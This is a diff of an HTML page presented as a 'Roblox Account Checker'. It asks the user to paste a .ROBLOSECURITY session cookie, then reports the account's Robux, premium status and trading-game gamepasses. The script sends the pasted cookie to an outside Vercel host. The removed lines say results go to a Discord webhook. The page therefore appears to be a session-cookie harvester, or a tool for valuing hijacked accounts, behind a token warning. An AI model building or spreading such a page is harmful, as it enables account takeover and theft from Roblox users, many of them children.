@@ -1,91 +1,105 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Checker</title>
+  <title>Roblox Account Checker – .ROBLOSECURITY</title>
   <style>
-    body { font-family: Arial, sans-serif; max-width: 620px; margin: 40px auto; padding: 20px; background: #0d1117; color: #e6edf3; }
-    textarea { width: 100%; height: 160px; background: #161b22; color: #e6edf3; border: 1px solid #30363d; padding: 12px; font-family: monospace; resize: vertical; border-radius: 6px; }
-    button { padding: 14px 40px; background: #238636; border: none; color: white; font-size: 17px; cursor: pointer; margin: 20px 0; border-radius: 6px; font-weight: bold; }
-    button:hover { background: #2ea043; }
-    #result { margin-top: 30px; padding: 20px; background: #161b22; border: 1px solid #30363d; border-radius: 8px; min-height: 200px; line-height: 1.55; }
-    .error { color: #f85149; } .success { color: #3fb950; } b { color: #c9d1d9; } small { color: #8b949e; }
-    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #30363d; display: block; }
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #111; color: #eee; }
+    textarea { width: 100%; height: 140px; background: #222; color: #eee; border: 1px solid #444; padding: 12px; font-family: monospace; resize: vertical; }
+    button { padding: 14px 32px; background: #1e90ff; border: none; color: white; font-size: 17px; cursor: pointer; margin: 15px 0; border-radius: 4px; }
+    button:hover { background: #0c7ae6; }
+    #result { margin-top: 25px; padding: 20px; background: #1a1a1a; border: 1px solid #444; border-radius: 8px; min-height: 240px; line-height: 1.6; }
+    .error { color: #ff4d4d; } .success { color: #00ff9d; } b { color: #ddd; } small { color: #aaa; }
+    #avatar { max-width: 100%; height: auto; border-radius: 12px; margin: 15px 0; border: 2px solid #444; display: block; }
   </style>
 </head>
 <body>
 
-<h2>Roblox Account Checker</h2>
+<h2>Roblox Account Info from .ROBLOSECURITY Cookie</h2>
 
-<p style="color:#f0b429; font-weight:bold;">
-  <strong>UWAGA:</strong> Używanie cudzego .ROBLOSECURITY narusza regulamin Roblox i kończy się permanent banem.
+<p style="color:#ffcc00; font-weight:bold;">
+  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and can lead to permanent account ban.
 </p>
 
-<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez prefiksu '.ROBLOSECURITY=')"></textarea>
+<textarea id="cookie" placeholder="Paste the .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
 <br>
-<button onclick="checkAccount()">Sprawdź</button>
+<button onclick="checkAccount()">Check Account</button>
 
 <div id="result"></div>
 
 <script>
 async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
-  const resultDiv = document.getElementById('result');
-  resultDiv.innerHTML = '';
+  const result = document.getElementById('result');
+  result.innerHTML = '';
 
-  if (cookieVal.length < 180) {
-    resultDiv.innerHTML = '<span class="error">Cookie za krótki / wygląda na nieprawidłowy</span>';
+  if (cookieVal.length < 200) {
+    result.innerHTML = '<span class="error">Cookie is too short or invalid</span>';
     return;
   }
 
-  resultDiv.innerHTML = '<i>Trwa sprawdzanie konta... chwilę...</i>';
+  result.innerHTML = '<i>Checking account... please wait</i>';
 
   try {
-    const response = await fetch('/api/get-username', {
+    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
     });
 
-    const data = await response.json();
+    const json = await resp.json();
 
-    if (!response.ok || data.error) {
-      resultDiv.innerHTML = `<span class="error">Błąd: ${data.error || 'Nieznany problem z API'}</span>`;
+    if (json.error) {
+      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
       return;
     }
 
-    const d = data;
+    if (json.success) {
+      const creationDate = json.created !== 'failed to fetch'
+        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+        : '—';
 
-    const creationDate = d.created && d.created !== 'failed'
-      ? new Date(d.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
-      : '—';
+      let avatarHtml = json.avatarUrl
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
+        : '<p style="color:#ffcc00;">Could not load avatar</p>';
 
-    const avatarHtml = d.avatarUrl
-      ? `<img id="avatar" src="${d.avatarUrl}" alt="Avatar" onerror="this.style.display='none'">`
-      : '<p style="color:#f0b429;">Brak avatara</p>';
+      const mm2Passes = [429957, 1308795];
+      let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
+      const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
 
-    const mm2 = [429957, 1308795].filter(id => d.gamepasses?.includes(id)).length;
-    const amp = [189425850,951065968,951441773,6408694,60406961585546290,7124470,6965379,3196348,5300198].filter(id => d.gamepasses?.includes(id)).length;
-    const sab = [1227013099,1229510262,1228591447].filter(id => d.gamepasses?.includes(id)).length;
+      const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
+      let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
 
-    resultDiv.innerHTML = `
-      <span class="success">✓ Konto sprawdzone</span><br><br>
-      ${avatarHtml}
-      <b>Nick:</b> ${d.username}<br>
-      <b>Display:</b> ${d.displayName}<br>
-      <b>ID:</b> ${d.userId}<br>
-      <b>Premium:</b> <span style="color:${d.premium?'#3fb950':'#f85149'}">${d.premium ? 'TAK' : 'NIE'}</span><br>
-      <b>Email/Telefon:</b> <span style="color:${d.emailVerified?'#3fb950':'#f85149'}">${d.emailVerified ? 'TAK' : 'NIE'}</span><br>
-      <b>Robux:</b> <span style="color:#f0b429">${d.robux.toLocaleString('pl-PL')}</span><br>
-      <b>MM2 gp:</b> ${mm2}<br>
-      <b>AMP gp:</b> ${amp}<br>
-      <b>SAB gp:</b> ${sab}<br>
-      <b>Wiek:</b> ${d.ageDays} dni (${creationDate})<br>
-      <br><small style="color:#444;">Wynik został zapisany na Discord (jeśli webhook działa).</small>
-    `;
-  } catch (err) {
-    resultDiv.innerHTML = `<span class="error">Błąd połączenia: ${err.message}</span>`;
+      const sabPasses = [1227013099, 1229510262, 1228591447];
+      let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
+      const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
+
+      result.innerHTML = `
+        <span class="success">Account verified successfully!</span><br><br>
+        ${avatarHtml}
+        <b>Username:</b> ${json.username}<br>
+        <b>Display Name:</b> ${json.displayName}<br>
+        <b>User ID:</b> ${json.userId}<br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+        
+        <b>Email / Phone Verified:</b> <span style="color: ${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          ${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
+        </span><br>
+        
+        <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+        
+        <b>MM2 Gamepasses:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP Gamepasses:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
+        <b>SAB Gamepasses:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
+        
+        <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
+        <b>Created:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+      `;
+    }
+  } catch (e) {
+    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
   }
 }
 </script>
